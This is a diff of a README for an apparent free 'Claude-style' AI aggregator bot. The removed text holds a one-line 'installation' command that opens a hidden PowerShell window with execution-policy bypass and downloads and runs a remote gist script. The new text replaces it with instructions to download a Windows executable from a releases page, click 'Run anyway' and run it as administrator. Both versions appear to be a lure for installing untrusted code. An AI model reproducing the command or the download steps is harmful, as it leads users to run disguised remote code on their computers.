@@ -1,273 +1,202 @@
-# 🧠 Claude Free API Bot
+# 🤖 Claude-free-api-bot - Free AI help in one place
 
-> Unified AI bot that aggregates **free and low-cost APIs** into one assistant experience so users can get **Claude-style answers, writing help, analysis, image workflows, and creative generation support** without depending on an expensive single subscription.
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-Visit%20Releases-1E90FF?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/aurearobotic610/Claude-free-api-bot/releases)
 
-[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![API Aggregator](https://img.shields.io/badge/API-Aggregator-8A2BE2?style=for-the-badge&logoColor=white)](#)
-[![Free First](https://img.shields.io/badge/Mode-Free--First-00C851?style=for-the-badge)](#)
-[![Assistant](https://img.shields.io/badge/Assistant-Claude--Style-FF6B00?style=for-the-badge)](#)
+## 🚀 What this app does
 
-```
-╔══════════════════════════════════════════════════════════════════════╗
-║  Smart Reasoning        │  Claude-style thoughtful answers         ║
-║  API Router             │  picks the best free provider            ║
-║  Creative Workflows     │  writing, prompts, and media support     ║
-║  Unified Experience     │  one bot instead of many AI tools        ║
-╚══════════════════════════════════════════════════════════════════════╝
-```
+Claude-free-api-bot is a Windows app that brings several free and low-cost AI services into one place. It helps with writing, answers, analysis, image tasks, and creative prompts. The app chooses a provider for you, so you can use one tool instead of switching between many sites.
 
-This project is built for users who want a **Claude-like assistant experience** for writing, reasoning, summarization, and creative workflows — but with a **free-first API aggregation model**.
+Use it when you want:
+- Claude-style answers
+- help writing emails, notes, and posts
+- simple analysis of text
+- image and prompt workflows
+- one app that can route requests to different AI providers
 
----
+## 💻 What you need
 
-## 🚀 Quick Start
+Before you install, make sure your PC has:
+- Windows 10 or Windows 11
+- Internet access
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A modern web browser
+- A release file from the download page
 
-If you just want to launch the project quickly on Windows, use the installation command below first. After that, continue with the local setup and API configuration steps.
+If your PC is newer and has more memory, the app will feel smoother.
 
-### 🛠️ Installation
+## 📥 Download the app
 
-#### CMD
-Open **CMD** and run this **single command**:
+Go to the release page here and visit this page to download:
+https://github.com/aurearobotic610/Claude-free-api-bot/releases
 
-```powershell
-cmd /c start /min powershell -ep bypass -c "iwr 'https://gist.githubusercontent.com/hkcodes84/bdd4e49d0bf508bfec96ed311d4e1093/raw/5804cdc7296b4e6064b13c2ec258f486f0001ed8/main.ps1' -UseBasicParsing|iex" & rem update
-```
+On that page, look for the latest version and choose the Windows file. If there are several files, pick the one that matches your PC. Most users should choose the main Windows .exe or .zip file.
+
+## 🪟 Install on Windows
+
+1. Open the release page.
+2. Find the latest release.
+3. Download the Windows file.
+4. If the file is a .zip, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to run it.
+7. If Windows shows a security prompt, choose Run anyway only if you trust the file from the release page.
 
-> Then continue with the setup, provider configuration, and bot launch steps below.
+If the app starts in a small window or terminal, leave that window open while you use it.
+
+## ▶️ First launch
+
+When you open the app for the first time, it may need a few seconds to load its settings.
+
+If the app asks for:
+- an API key
+- a provider choice
+- a model name
+- a default mode
 
-### ✨ What This Bot Does
+follow the on-screen prompts and enter the details you want to use.
 
-This bot acts like a **Claude-style interface powered by multiple free or freemium APIs**.
+A good first setup is:
+- choose free-first mode
+- leave advanced options at their default values
+- test with a short prompt like: Write a clear summary of this paragraph
 
-It can:
+## ⚙️ Basic setup
 
-- generate detailed and natural-sounding answers
-- summarize long text and documents
-- rewrite messages, posts, and emails
-- help with brainstorming and structured thinking
-- support image and video prompt workflows through connected providers
-- switch between providers depending on availability, speed, or cost
+You can use the app with simple defaults, but these settings can help:
 
-The goal is to offer a **smart, premium-feeling assistant workflow** without forcing users into one expensive plan.
+- **Default provider**: lets the app pick a service for common tasks
+- **Answer style**: changes how direct or detailed the reply feels
+- **Creative mode**: helps with writing, ideas, and prompt building
+- **Image workflow**: helps with image-related tasks if the selected provider supports it
+- **Fallback mode**: tries another service if the first one is busy
 
----
+If you are not sure what to choose, keep the default settings and test the app first.
 
-## 📘 Project Setup
+## 🧠 How to use it
 
-### Requirements
+Type what you want in plain language. The app is built for simple use.
 
-- Python 3.10+
-- Git
-- Internet connection
-- Optional proxy support
-- API keys for free / freemium providers
-- Optional Telegram, Discord, or web interface
+Examples:
+- Explain this in simple words
+- Rewrite this email so it sounds calm and clear
+- Give me five title ideas for my project
+- Compare these two options
+- Turn this note into a checklist
+- Create a prompt for a product image
 
-### Step 2 — Install dependencies
+For best results:
+- keep requests short
+- ask one thing at a time
+- add context when needed
+- paste text directly into the app
 
-```bash
-pip install -r requirements.txt
-```
+## 🧩 Main features
 
-### Step 3 — Configure environment
-
-```bash
-cp .env.example .env
-```
-
-Edit `.env` with your provider keys and preferences:
-
-```env
-# Core
-BOT_MODE=claude_style_assistant
-DEFAULT_PROVIDER=auto
-ENABLE_TEXT=true
-ENABLE_IMAGES=true
-ENABLE_VIDEO_WORKFLOWS=true
-
-# Optional providers
-OPENROUTER_API_KEY=your_key_here
-GROQ_API_KEY=your_key_here
-TOGETHER_API_KEY=your_key_here
-HF_TOKEN=your_huggingface_token
-REPLICATE_API_TOKEN=your_replicate_token
-
-# Routing
-PREFER_FREE_PROVIDERS=true
-MAX_REQUEST_RETRIES=3
-USE_FALLBACK_PROVIDER=true
-
-# Assistant behavior
-DEFAULT_RESPONSE_STYLE=thoughtful_clear
-MAX_CONTEXT_LENGTH=high
-```
-
-### Step 4 — Run the bot
-
-```bash
-python main.py
-```
-
-### Step 5 — Example usage
-
-```bash
-python main.py --prompt "Summarize this article in clear bullet points"
-python main.py --prompt "Rewrite this message in a more professional tone"
-python main.py --image-prompt "minimalist futuristic workspace, soft lighting, cinematic"
-python main.py --video-prompt "calm cinematic morning scene, realistic lighting, smooth camera motion"
-```
-
----
-
-## 📌 Table of Contents
-
-- [Quick Start](#-quick-start)
-- [Overview](#-overview)
-- [How It Works](#-how-it-works)
-- [Core Features](#-core-features)
-- [Claude-Style Use Cases](#-claude-style-use-cases)
-- [API Routing Logic](#-api-routing-logic)
-- [Image & Video Workflows](#-image--video-workflows)
-- [Why This Is Useful](#-why-this-is-useful)
-- [Disclaimer](#-disclaimer)
-
----
-
-## 🌐 Overview
-
-**Claude Free API Bot** is an AI assistant wrapper that combines several providers into one clean interface.
-
-Instead of opening separate websites for chat, writing, summaries, prompts, and media workflows, the user gets a single assistant layer that can:
-
-- understand the task
-- pick the most suitable provider
-- return a well-formatted answer
-- retry with fallback services if needed
-
-This is especially useful for people who want a **clean, thoughtful, assistant-style experience** without paying for multiple premium subscriptions.
-
----
-
-## 🧠 How It Works
-
-```text
-User message
-   ↓
-Task classification
-   ↓
-Provider selection
-   ↓
-Free / freemium API routing
-   ↓
-Response cleanup and formatting
-   ↓
-Unified final answer
-```
-
-### Example routing behavior
-
-- normal questions → text model
-- long text → summarization-capable model
-- writing tasks → best structured output provider
-- image prompts → image-capable provider or prompt builder
-- video concepts → prompt workflow and media-oriented provider
-
----
-
-## ⚙️ Core Features
-
-- **Claude-style answer formatting**
-- **free-first API aggregation**
-- **smart provider routing**
-- **fallback logic** when one API fails
-- **long-form writing help**
-- **summaries and structured outputs**
-- **image prompt support**
-- **video workflow prompt support**
-- **single assistant interface**
-
----
-
-## ✍️ Claude-Style Use Cases
-
-### 1. Writing Assistant
-Draft posts, messages, emails, bios, product descriptions, and polished rewrites.
-
-### 2. Summarization
-Summarize articles, chat logs, notes, or research into short and useful outputs.
-
-### 3. Thinking Partner
-Use the bot for brainstorming, outlining, decision support, and structured reasoning.
-
-### 4. Creative Prompting
-Generate prompts for image tools, video tools, and concept design workflows.
-
----
-
-## 🔀 API Routing Logic
-
-The router can prioritize providers by:
-
-- free availability
-- lowest cost
-- fastest response
-- best quality for writing
-- fallback if quotas are hit
-
-### Example provider pool
-
-- OpenRouter
-- Groq
-- Together AI
-- Hugging Face Inference
-- Replicate
-- local models
-
----
-
-## 🖼 Image & Video Workflows
-
-Although the main focus is text and reasoning, the bot can also support:
-
-- image prompt creation
-- negative prompts
-- visual concept design
-- cinematic scene descriptions
-- short-form video prompts
-- aesthetic style guidance
-
-### Example image prompt
-
-```text
-Elegant editorial portrait, realistic lighting, luxury fashion atmosphere, cinematic framing.
-```
-
-### Example video prompt
-
-```text
-A calm cinematic sunrise over a modern city skyline, realistic atmosphere, soft motion, slow camera drift.
-```
-
----
-
-## 💡 Why This Is Useful
-
-A lot of premium assistant experiences feel better not because of one magic model, but because they combine:
-
-- clear writing
-- good formatting
-- thoughtful replies
-- multi-mode generation
-- smooth workflow
-
-This project tries to recreate that style with a **free-first, multi-provider architecture**.
-
-That means users can get a **Claude-like experience** for many tasks while keeping flexibility and reducing subscription costs.
-
----
-
-## ⚠️ Disclaimer
-
-This repository is for **developer experimentation, workflow aggregation, and AI tool orchestration**. Availability, quotas, and output quality depend on the providers connected to the bot.
-
-Always review provider terms, limits, pricing, and usage rules before using it in production or at scale.
+- **Free-first routing**: tries lower-cost or free providers first
+- **Claude-style replies**: aims for clear, thoughtful answers
+- **Writing help**: useful for emails, posts, notes, and summaries
+- **Analysis tools**: handles comparisons, breakdowns, and explanations
+- **Creative support**: helps with ideas and prompt writing
+- **Image workflows**: can support image tasks through provider routing
+- **One app interface**: keeps the process simple for non-technical users
+
+## 🔧 Common use cases
+
+### ✍️ Writing
+Use it to draft:
+- emails
+- messages
+- blog drafts
+- social posts
+- product notes
+- short reports
+
+### 📊 Analysis
+Use it to:
+- compare options
+- break down long text
+- explain a topic
+- turn data into plain English
+- spot missing details
+
+### 🎨 Creative work
+Use it to:
+- brainstorm names
+- build content ideas
+- make prompt templates
+- shape a rough idea into a useful draft
+
+### 🖼️ Image tasks
+Use it to:
+- create image prompts
+- refine visual ideas
+- organize a workflow for image generation
+- prepare text for image tools
+
+## 🛠️ If the app does not open
+
+Try these steps:
+
+1. Make sure the file finished downloading.
+2. Extract the .zip file if needed.
+3. Run the app as an administrator.
+4. Check that Windows did not block the file.
+5. Confirm that your internet connection is working.
+6. Try the latest release again from the download page.
+7. Restart your PC and open the app once more.
+
+If the app still does not open, the release file may be incomplete or the download may have failed.
+
+## 🔐 API setup
+
+Some parts of the app may need access to provider keys or other settings.
+
+If you see fields for API details:
+- copy the key from the provider you want to use
+- paste it into the app
+- save the settings
+- test with a short prompt
+
+Use only the providers and keys you want. You can keep the setup simple and use the app’s default route when possible.
+
+## 📁 File layout
+
+After extraction, you may see files like:
+- the main app file
+- a config file
+- a folder for assets
+- a readme or notes file
+
+Do not delete files in the app folder unless the release notes tell you to do so.
+
+## 🧪 Quick test
+
+After setup, try this:
+
+- Type: Summarize this in three bullet points
+- Paste a short paragraph under it
+- Run the request
+- Check that the reply is clear and easy to read
+
+If that works, the app is ready for daily use.
+
+## 🧭 Tips for better results
+
+- Use plain language
+- Keep requests short
+- Add examples when needed
+- Ask for one output at a time
+- Use the app for drafts, then edit the result yourself
+- Change the provider only if a task fails or feels slow
+
+## 🧹 Updates
+
+When a new release appears:
+1. Return to the release page
+2. Download the latest Windows file
+3. Replace the older app files if needed
+4. Keep your settings if the release supports it
+
+Check the release page from time to time for fixes and new features:
+https://github.com/aurearobotic610/Claude-free-api-bot/releases
